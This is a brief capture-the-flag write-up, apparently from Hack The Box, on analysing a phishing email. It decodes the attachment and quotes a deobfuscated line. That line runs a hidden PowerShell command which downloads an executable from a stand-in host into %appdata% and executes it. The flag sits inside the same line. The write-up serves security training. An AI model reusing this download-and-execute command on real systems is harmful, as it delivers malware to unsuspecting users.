## Challenge Writeup
First we see that we get an email file. We base64 decode the second body and see that there's a javascript unescape. Through deobfuscation, we can see that there's a flag in the line:
```
Error = Process.Create("cmd.exe /c powershell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://standunited.htb/online/forms/form1.exe','%appdata%\form1.exe');Start-Process '%appdata%\form1.exe';$flag='HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}", null, objConfig, intProcessID)
```
